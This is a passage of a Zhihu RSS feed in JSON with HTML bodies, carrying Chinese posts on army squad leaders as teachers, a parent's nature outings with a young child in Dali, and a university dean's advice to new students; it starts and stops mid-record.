class=\"ztext-empty-paragraph\"><br></p>\n<p>摸着石头过河，那一代合资人进行了艰辛探索。也许我们应该知道那些企业家的名字：北京吉普第一任董事长吴忠良、上海大众第一任总经理方宏、神龙汽车第一任总经理宋祖慰、广州标致第一任总经理刘煜伟……</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b><i>更多内容，请关注同名公众号。</i></b></h2>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-dian-dong-qi-che-bai-ren-hui?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">电动汽车百人会</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/409081491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"军营里，有一种老师叫「班长」，关于他们有哪些故事和话语让你记忆深刻？","date":"2021-09-10 06:48:24","description":"\n<p>今天是第37个教师节</p>\n<p>在军营也有一群“老师”</p>\n<p>他们是战友眼中的“顶梁柱”</p>\n<p>是素质过硬的教练员</p>\n<p>是倾心“传帮带”的引路人一批批有志青年成长为合格军人他们毫无保留倾囊相授他们有一个共同的名字<b>班  长！！！</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-8a3e1cd5eedac034c9cbc2b2c3e2cefd\" data-watermark-src=\"v2-6511347c0d68224566187420c816d472\" data-private-watermark-src=\"v2-8086a2998c2f0fa729b51575ec88daf6\"></p>\n<p>训练场上</p>\n<p>铁面无情的是他们</p>\n<p>只为打下良好基础</p>\n<p>平时只有多流汗</p>\n<p>战时才能少流血</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-27f187b439068e6b1d5cd5101fdd6573_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-27f187b439068e6b1d5cd5101fdd6573\" data-watermark-src=\"v2-1a4bcba11589db9d50ed9b411036a161\" data-private-watermark-src=\"v2-338d8c8038ab05c123fd458aa1770798\"></p>\n<p><br></p>\n<p>生活中</p>\n<p>关怀备至也是他们因为他们懂得</p>\n<p>以心交心才能换得真心</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef0ccd52960ce2a30706148e11c88dee_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"630\" data-watermark=\"original\" data-original-src=\"v2-ef0ccd52960ce2a30706148e11c88dee\" data-watermark-src=\"v2-0c636f8d519f2365c93ab94886ee770a\" data-private-watermark-src=\"v2-7e0ed323dd43c7784941dd7fa7c9e08e\"></p>\n<p>急难险重任务面前</p>\n<p>出色完成任务的更是他们</p>\n<p>因为他们明白<br></p>\n<p>干出样子是职责所在</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d127cc64a22009a1eb8c5cea61abbe53_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d127cc64a22009a1eb8c5cea61abbe53\" data-watermark-src=\"v2-1a1a33ca0700540c70b0a5944baad566\" data-private-watermark-src=\"v2-c5837ad765004571da2603ffb0869cf7\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情①：知心</b></p>\n<p>一个班虽然人不算多，但也称得上是各有千秋！不过没关系，班长对每个人情况“如数家珍”，一个表情、一个动作、一声叹息，都会引起班长的注意，面对面谈心交流，专治各种“疑难杂症”。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ecf4b424d262b0dfa1ea9712eb59717a_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-ecf4b424d262b0dfa1ea9712eb59717a\" data-watermark-src=\"v2-d777ddf979c9e26cde7e4c39464c7392\" data-private-watermark-src=\"v2-011be1a0bba1f7bfc95099d059e4434a\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情②：暖心</b></p>\n<p>不论是冰冻三尺还是骄阳似火，班长的关心总能直抵内心。想家时一句安慰、生日时一声祝福、成功时一个肯定，让你感到身边有个精心照顾你的暖心大哥。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0771c159ec2a32a71dbf817b626c58e0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-0771c159ec2a32a71dbf817b626c58e0\" data-watermark-src=\"v2-2e9110082a5f7d8857f2268b43c782d8\" data-private-watermark-src=\"v2-8db38f5dbc32f18941d2fbcc067c3d27\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情③：信心</b></p>\n<p>筋疲力尽没动力？任务陌生有畏难？卫生打扫怕脏累？学习劲头不够足？只要有需要，班长总能在身边！一句“跟我来！看我的！有我在！”立马让你找回状态、信心百倍！<br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-910731ca5c705d3bca410a90249bf754_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-910731ca5c705d3bca410a90249bf754\" data-watermark-src=\"v2-a72f75c2fb47b43885ac74110bfa40be\" data-private-watermark-src=\"v2-06f0c9e3005c9fd7baf035084e3d6be8\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-81ef4dfe998e7dc32518d5e6925f9de9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"51\" data-rawheight=\"51\" data-watermark=\"original\" data-original-src=\"v2-81ef4dfe998e7dc32518d5e6925f9de9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真情④：耐心</b>、</p>\n<p>军人的成长是破茧成蝶的过程，磨砺中退掉所有青涩和稚嫩。在军旅之路，总有班长伴我们左右，化身为指路明灯，不论进步快或慢，都耐心指引我们向更高的山去冲锋。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6608086cf2605109207098b5733a1e45_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-6608086cf2605109207098b5733a1e45\" data-watermark-src=\"v2-da8d4e353b88bcafea9ec9d427d82be4\" data-private-watermark-src=\"v2-91096068b55bb3a2076d012d92ed74c2\"></p>\n<p><br></p>\n<p><b>一声班长，一生班长</b></p>\n<p><b>军营有你，未来可期军旅路上</b></p>\n<p><b>都有一个前行的背影今天我们向班长致敬</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">26 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/23001321?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队如何当好班长 ?</a><br><a href=\"http://www.zhihu.com/question/35520013?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在部队，大家都经历过哪些有意思的班长？</a><br>\n","link":"http://www.zhihu.com/question/485594623/answer/2113250381?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"从小带孩子出去游玩、看世界，它能给孩子带来哪些意义？","date":"2021-09-10 04:52:22","description":"\n<p><b>“好好玩！玩完回家要写作文啊！”</b>小时候，每次出门旅行前都会被这样提醒。然后，写作文的压力，就在旅途中时不时冒出来膈应我，体验超级不好。</p>\n<p>这是我看到这个题目之后第一件想到的事，所以，原谅我这里要先diss一下我二十多年前的熊爸妈 。</p>\n<p><b>写作文不是出门玩的意义，【能不能记住什么】也并不是带孩子旅行的全部意义。</b></p>\n<p><b>有没有意义，取决于孩子跟着什么样的人。</b></p>\n<p>因为认知的不同，孩子有自己看世界的独特角度。不同年龄的孩子们去游玩、看世界，都能有不一样的收获。</p>\n<p>这些收获，可能是认识了一两种新的植物；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-716c32f639da9a8df62eeb9cd1c65b42_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-716c32f639da9a8df62eeb9cd1c65b42\" data-watermark-src=\"v2-0a99899aeaa80b4cc9edf3e05ec31f60\" data-private-watermark-src=\"v2-cd70d9d0fa341479a558b2c1738ea7da\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-55817cb7b6dc42b397209fae6878903e_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-55817cb7b6dc42b397209fae6878903e\" data-watermark-src=\"v2-ae2883fe667f223a49f7ef17328ea975\" data-private-watermark-src=\"v2-0fd175896c90d772d802a61f5f3db858\"></p>\n<p>可能是知道了爬山虽然有点累，但坚持坚持就能看到更美的风景；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-807dbb28279c21be12b5a33fcaf9fbee_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-807dbb28279c21be12b5a33fcaf9fbee\" data-watermark-src=\"v2-e907891c264c54f568ef91d3663c7f86\" data-private-watermark-src=\"v2-75e5ba3931ced67c8ac44f4a876b4382\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-23f926f586fa89887520db474ab725a8_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-23f926f586fa89887520db474ab725a8\" data-watermark-src=\"v2-ed470cd6810b5e2ae759b08728c24e30\" data-private-watermark-src=\"v2-ffdb4971c34916546d65e8ec21075bfd\"></p>\n<p>可能是见到了只在书里看到过的交通工具；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-37944bc500a30a52f5c7d9c8315ef7cf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37944bc500a30a52f5c7d9c8315ef7cf\" data-watermark-src=\"v2-69923e8af55e2f70dfec17c5e0be3d4d\" data-private-watermark-src=\"v2-0a90dc212f1cd265e8d989abc719ff88\"></p>\n<p>可能只是学会了自己收拾行李；</p>\n<p>还有可能发现【走出去】能看见那么多有意思的东西，而对世界充满好奇。</p>\n<p>所以每次说到带娃去哪儿玩，常常被质疑说“孩子小了，根本记不住！”我都一脸黑线！<b>记不记得住，真的只是我们衡量带孩子旅行有没有收获的诸多维度之一。</b>记不住旅途的所见所闻，绝不代表没有收获。</p>\n<p>带四岁的小皮皮旅行过十几次，现在移居到大理之后，更是户外活动不断。</p>\n<p>在一次次的户外活动中，我一直在思考，怎样让孩子的旅途更有趣，有更多收获。</p>\n<p>最后发现，<b>在观察中发现兴趣，以兴趣为切入点，带孩子去探索发现，回家之后还可以拓展</b>（看相关视频，查阅资料）。</p>\n<p>最后，这一次拓展延伸的结果，还可以生成下一次安排户外活动的主题。</p>\n<h2>分享小皮皮的几次户外活动，以及我从中发现的教育契机。</h2>\n<h2>只要有心，每一次的收获都不同。</h2>\n<p><b>一、寻找“蝴蝶的世界”。</b></p>\n<p>小皮皮偶然在小区看见一只颜色奇怪的蝴蝶，我说：“哇！蝴蝶！”小皮皮说：“这不是蝴蝶，蝴蝶是黄色和白色的，也没有这么大！”</p>\n<p>我没有马上否定，突然想好下次的户外活动的目的地了：“蝴蝶泉”。</p>\n<p>出发之前我告诉他这次目的地的名字，让他猜猜那是个什么样的地方。到达目的地，小皮皮超级期待，走得比大人还快。第一站是【蝴蝶博物馆】，在一个温室里，有好多种蝴蝶飞来飞去。</p>\n<p>我没有在他看得认真的时候，急着讲解，我相信孩子天然的好奇心。在他问我第一个问题的时候，我终于有机会搬出了查阅已久的资料，告诉他，并不是只有我们经常看见的那种蝴蝶才是蝴蝶，仅仅在中国，蝴蝶就有好几千种呢！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d5cdd4bb81d04039eb239cdc6f8bf1f0_720w.jpg?rss\" data-rawwidth=\"1299\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d5cdd4bb81d04039eb239cdc6f8bf1f0\" data-watermark-src=\"v2-e2da9ef27781e92a65e31c338f833918\" data-private-watermark-src=\"v2-6c1dd53e01ea53a190c8fa4dcc7e2786\"></p>\n<p>到这里，小皮皮又开始继续观察，我就没有说下去。等他下次发问，又可以继续科普。</p>\n<p>看蝴蝶的过程中，发现地上也有好多蝴蝶，很多都被游客不小心踩死，我和小皮皮用一个袋子套着手，把蝴蝶送到树上去。他知道自己救了小动物，特别开心。</p>\n<p>这次的过程，小皮皮不仅得到了【自然科普】，还帮助了小动物，体验到付出爱心的快乐，我觉得很有意义。</p>\n<p><b>二、爬山，找蘑菇，带走垃圾。</b></p>\n<p>雨季的时候，云南的山里有各种各样的蘑菇。蘑菇这么可爱的物种，是一定要带小皮皮去看看的。</p>\n<p>很多有毒，所以没有摘，更没有吃，只是蹲下来认真欣赏就很满足了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7a6add67ecb59a8646c1d9cd72ad6cb3_720w.jpg?rss\" data-rawwidth=\"1125\" data-rawheight=\"1750\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7a6add67ecb59a8646c1d9cd72ad6cb3\" data-watermark-src=\"v2-90a0494c81426a85ea7a50191dffa684\" data-private-watermark-src=\"v2-a513174e975ddabc758d65f43cbfcb5d\"></p>\n<p>路上会遇到超可爱的松鼠，完全不怕人，小皮皮真正感受到自然的和谐。</p>\n<a href=\"https://www.zhihu.com/video/1419637724492386304\"></a><p>偶尔会发现矿泉水瓶和塑料袋，就和小皮皮讨论，这么美的自然环境，不应该出现这些东西，而且如果小动物不小心吃掉，还会被伤害。</p>\n<p>下山的时候，捡走了一大袋垃圾。我们约定，之后不会乱扔垃圾，条件允许的情况下，也会像今天一样，带走大自然中别人留下的垃圾。</p>\n<p>我想，小皮皮虽然还不太明白所以然，但至少有一些初步的环保意识了吧。</p>\n<p>回家之后，我也会和他一起看看关于地球的小短片，知道我们为什么要保护地球上的小动物和植物们。</p>\n<p>这一次的爬山，我相信小皮皮也不仅仅是锻炼了身体，体会到寻找蘑菇的开心，更懵懵懂懂的知道了，要保护环境。</p>\n<p><b>生活皆教育，只要有心，就有无数契机。</b></p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/85724f4099df3bbe69b629eb969367e4\" data-hash=\"85724f4099df3bbe69b629eb969367e4\" data-hovercard=\"p$b$85724f4099df3bbe69b629eb969367e4\">@知乎亲子</a> </p>\n<p><br></p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/85724f4099df3bbe69b629eb969367e4\" data-hash=\"85724f4099df3bbe69b629eb969367e4\" data-hovercard=\"p$b$85724f4099df3bbe69b629eb969367e4\">@知乎亲子</a> </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/361818529/answer/2113016187?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">218 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/436028351?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待最好的亲子活动是带着孩子去观察和感受大自然，带着孩子去旅行是很有意义的一件事吗？</a><br><a href=\"http://www.zhihu.com/question/451183807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">既然 1 岁孩子小什么都不懂，那么带 1 岁孩子出去旅游是浪费吗？</a><br>\n","link":"http://www.zhihu.com/question/361818529/answer/2113016187?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"大学四年，如何高质量地度过？","date":"2021-09-09 12:37:58","description":"\n<p>大家好，我是秦春华，很高兴来到知乎《大学第一课》和大家交流。</p>\n<p>一个月前，知乎的同学邀请我参加今天的活动，我问他们要我讲什么呀，他们说，您是考试院长，就结合您的经历和见闻，和即将迈进大学的同学们聊聊如何应对大学考试和大学生活吧。这对于我来说是个难题。用我女儿鄙视我的话说，我虽然是个考试院长，其实不会考试。我除了在高考时考得比较好之外，到目前为止没经历过什么重要的考试。</p>\n<p>但是，作为一个在大学里学习生活工作了三十年的教员，我见到了太多困惑、挣扎和觉醒的案例。在我的 Office Hour，学生和我聊的最多的不是学术，而是大学生活、心理问题乃至感情经历。这使我意识到，对你们而言，也许真正重要的，不是学习，不是考试，而是如何在大学里度过一段有意义的生命。</p>\n<p><br></p>\n<p><b>什么是大学</b></p>\n<p>同学们刚刚进入大学校门，你们有没有问过自己一个问题：什么是大学？这个你们即将在这里生活四年甚至更长时间的地方，对于你们而言意味着什么？</p>\n<p>实际上，从起源来看，东西方的大学是不一样的，尽管中国的现代大学制度是从西方引进的。西方的大学，无论是欧洲的还是美国的，和宗教有着极其密切的联系，但中国的大学则显著不同，除了历史上少数的教会大学之外，中国的大学诞生于 19 世纪末 20 世纪初的民族危难之际；20 世纪 30 年代外敌入侵，北大、清华、南开颠沛流离，在战火中组建西南联大，谱写了中国大学史上悲壮辉煌的绝唱；60 年代，以西安交通大学、西北工业大学等为代表的西迁高校，用一代代师生的搬迁史、创业史、奋斗史、发展史铸就了“西迁精神”的丰碑。一百多年来，除了大学的内在基因之外，中国大学与生俱来带有救亡色彩，其影响一直持续到今天。也就是说，大学对于同学们而言，不仅仅意味着个人事务，更重要的是，大学承担了实现中华民族伟大复兴的使命，是要救国强国的。特别是今天，面对极度复杂的国际环境，认识到这一点尤其重要。同学们，在中国上大学，一定要把自己和国家民族的命运联系在一起，这绝不是空话，而是刻在我们骨子里的基因。</p>\n<p><br></p>\n<p><b>你需要从大学获得什么</b></p>\n<p>那么，人为什么要上大学呢？你们来到大学又想要获得什么？</p>\n<p>我想起了三十年前，我只身一人扛着行李来到京城上大学，内心忐忑不安，但又对未来充满了希望。但那时候，我并没有想过这些问题。只想毕业后能有一个好工作。是的，大学会带给你一份好工作；从一般意义上说，越是好大学，会带给你更高的收入。知乎上有很多相关的话题和讨论。</p>\n<p>除此之外，我认为，大学对人最大的价值和意义在于：一所大学塑造了一个人的思维方式、气质格局、生活态度和价值观。概括说来，上大学最重要的是要获得四个“识”：知识、见识、胆识和认识。</p>\n<p><br></p>\n<p><b>知识</b></p>\n<p>第一个“识”是知识。这里所说的知识既不是你从知乎或者百度上搜索到的可以“涨知识”的内容，也不是你为了显示自己具有“深厚”的传统文化修养而死记硬背下来的几百首古诗词，甚至不是你在数学、物理、化学和工程等课堂上和教材里学到的公式和定理。真正的知识，是普罗米修斯从奥林匹斯山上盗取的火，是他向人类传授的艺术、写作、数学、天文、建筑和医学，是今天我们称之为“通识教育”，从而使人类摆脱了愚昧和无知的那些无比珍贵的礼物。</p>\n<p><br></p>\n<p><b>见识</b></p>\n<p>仅有知识是不够的，大学还将带给你第二个“识”：见识。</p>\n<p>所谓见识首先在于深刻的洞察力。《史记》里记载，秦穆公用五张黑羊皮从楚国赎回了百里奚，和他谈了三天三夜，高兴极了。可百里奚说，我的朋友蹇叔才是真正有才能的人。为什么这么说呢？因为我两次听了他的话都逃脱了危险，最后一次，我因为贪图富贵，没听他的话，结果就遭遇大难，差点连命都没了。你可以想象蹇叔知人识势的洞察力是多么惊人！除了洞察力，还要有判断力和感知力，而真正的见识就是洞察力、判断力和感知力的完美结合。</p>\n<p>当年刘邦进入咸阳后，其他人都在忙着争夺财宝美女，只有萧何直奔丞相府，把秦朝所有的地图、书籍和档案资料搜集起来。找到这些资料，就能知道全国有多少人口，府库有多少资源、秦朝的财政情况如何、全国各地有哪些险要之地需要驻兵把守，等等。在争夺天下的人眼中，这是比金银财宝要重要的多的东西——这是见识。</p>\n<p>王选先生早在 20 世纪 70 年代就确立了汉字激光照排的研发目标，提出跳过国外的“二代机”、“三代机”，直接研发“四代机”，使中国告别了铅与火，走进了光与电——这是见识。</p>\n<p>2012 年任正非就决定启动“鸿蒙计划”，他早就预见到了国外技术对我们“卡脖子”的那一天——这也是见识。</p>\n<p><br></p>\n<p><b>胆识</b></p>\n<p>第三，光有知识和见识还不够，人还要有胆识。说到这里我想起了女篮的一场比赛。去年年初，中国女篮正在海外比赛，为了争夺进军东京奥运会的资格而奋战，就在这个时候，新冠疫情在国内爆发了。在这种特殊时刻，赛前中国队心理教练黄菁和队员们说了这么一段话：</p>\n<p>当需要一个人站出来时，那叫勇敢；                 <br>当一个团队挺身而出时，那叫担当；        <br>当一个国家身处逆境，呼唤一种精神时，        <br>那就是使命，就是信念，就是一往无前！    </p>\n<p>什么是胆识？卒然临之而不惊，无故加之而不怒，泰山崩于前而色不变。面对危险时毫不畏惧，“虽千万人，吾往矣！“</p>\n<p>面对困难时毫不退缩，坚持到底；</p>\n<p>面对压力诱惑时“至大至刚”，“不惑，不忧，不惧”。</p>\n<p>归根到底，一个人的勇气来源于信念，事无不可对人言，相信自己做的是正确的事，自然没有丝毫犹豫和忧惧。今天的大学，在很大程度上忽视了对学生的“胆识”教育。</p>\n<p><br></p>\n<p><b>认识</b></p>\n<p>最后，所有这些知识、见识和胆识加在一起，形成最后一个“识”：认识。首先是认识你自己，也就是你作为一个独一无二的创造体，来到这个世间的使命。每个人的出生都是一个新的开始，新世界之所以是新的，就是因为有新的人出现，从而形成新的创造。</p>\n<p>其次是认识他人。人是社会性动物，只认识自身是远远不够的，还必须认识他人，和他人发生联系。孔子说：“仁者，人也。”这个“仁”，指的就是人和人之间的关系。只有在和他人的联系之中，“仁”才能得以实现。实际上，这恰恰是现代教育特别重视培养孩子的社交能力的原因所在。</p>\n<p>第三是认识世界。我和世界的关系是什么？我在世界中的位置是什么？世界对于我的意义是什么？想清楚这些根本性的大问题，才能在我们脆弱而干涸的心中注入力量，帮助我们战胜人生途中的种种困厄和艰难。</p>\n<p><br></p>\n<p><b>刚进大学的你有没有思考过这些问题</b></p>\n<p>同学们马上就要迈进大学校门了。大学的第一年对于很多同学而言也许会很艰难，很难适应，如果要让我提一些建议的话，我觉得有以下几个方面也许是重要的。</p>\n<p>首先，你还是要有一个大致的想法和规划。首先要明确一个自己的目标：等大学毕业的时候，我要得到什么？这个目标不需要有多么高大上，甚至庸俗一点都没关系，有目标是第一位的。三十年前，我迈进北大校门的那一刻，我告诉自己：四年后我要成为这个校园里最优秀人群中的一个。这个目标一直激励我去不断努力。其实，在追求目标的过程中，你自己就会发现，很多情况都变化了，你自己的想法也许会改变。这些都没关系，重要的是一定要有一个目标。</p>\n<p>其次，你应当学会自主地选择：包括选什么课，要不要去参加社团，参加什么社团，要不要读研究生，要不要留学，等等。选择的本质是时间和精力的分配，因为经济学上“机会成本”的存在，选择的代价有可能会很大。这里有个原则供你参考：一个是尽可能选基础的学科，以为将来的发展留有余地。北大元培学院有一个非常聪明的学生，在专业选择上遇到很大困惑，来找我商量。他原本在数学方向，可是他觉得自己和数学系的那些大牛相比，自己的智商被碾压；而且学数学也太辛苦了一些，所以他想去其他专业。我坚决反对。他听了我的劝，本科毕业后去了 MIT，现在在全球最顶尖的一个数据分析公司工作。二是不要从众，不要看别人干了什么自己也跟着去干，在做出决定之前，问问自己的内心，到底想要什么？这个选择是离目标更近了，还是更远了？等等。</p>\n<p>除了规划和选择之外，我要提的最重要的一个建议，就是谈恋爱的问题。从上大学的第一天开始，就要旗帜鲜明地把谈恋爱列为重要的目标之一。很多家长反对，最主要的原因是怕谈恋爱影响学习。这里恐怕混淆了大学学习和中学学习的概念。大学的学习不只是文化课的学习，而是更全面的社会生活的学习。恋爱、婚姻家庭是一个人一生中非常重要的部分，不在大学里学习，什么时候学习呢？我见到了太多优秀的学生，尤其是女生，上大学的时候一直是听爸爸妈妈话的乖乖女，埋头学习，不谈恋爱，等到工作以后，在父母的逼迫下凑合找一个，导致婚姻不幸。婚姻是要建立在了解和爱的基础上的，特别是识别人的能力很重要。不谈恋爱，不知道和异性如何交流和相处，怎么可能找到让自己幸福的伴侣呢？</p>\n<p>最后，作为一个不会考试的考试院长，还是和同学们谈谈应对考试的事情，要不然知乎的同学该不放过我了。有些“金句“在大学里面广为流传，什么“六十分万岁，多一分浪费”、“怎么期末越近，我心越浪“，这是很多大学生面对考试的态度，我知道同学们在高中三年的学习非常辛苦，但是我们不能进入大学之后就“刀枪入库，马放南山”。当你进入大学之后仍然需要如饥似渴地学习，但这时候的学习是全方位的学习，是听从自己内心的学习，是为你自己为国家为社会而学习。另一方面，同学们也不能把全部的精力都投入到为了绩点而奋斗的课本学习当中，那样就浪费了珍贵的大学时光，太可惜了。记住，从开学第一天起，你就离开了爸爸妈妈，成为一个真正独立的个体了。大学是你第一次独立生活的开始，大学也是一个让你接受教育并发现自己的地方，是一个让你获得第二次生命的地方。你可以自主选择你想走的道路，你可以自主选择和谁一起走，也能够承担这种选择带来的一切后果。自此之后，你还会经历数不清的考试，但那些考试，需要你运用在大学里学到的所有东西去认真面对，祝你们都能取得好成绩！Good Luck!</p>\n<p>谢谢大家！</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bei-da-qin-chun-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">北大秦春华</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/331077570/answer/2112001535?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">981 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/304706998?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大学生应当怎样规划自己的大学生活？</a><br><a href=\"http://www.zhihu.com/question/316623814?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样才能高质量的过完大学四年？</a><br>\n","link":"http://www.zhihu.com/question/331077570/answer/2112001535?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"小户型怎么设计，才能增大收纳储物空间？","date":"2021-09-09 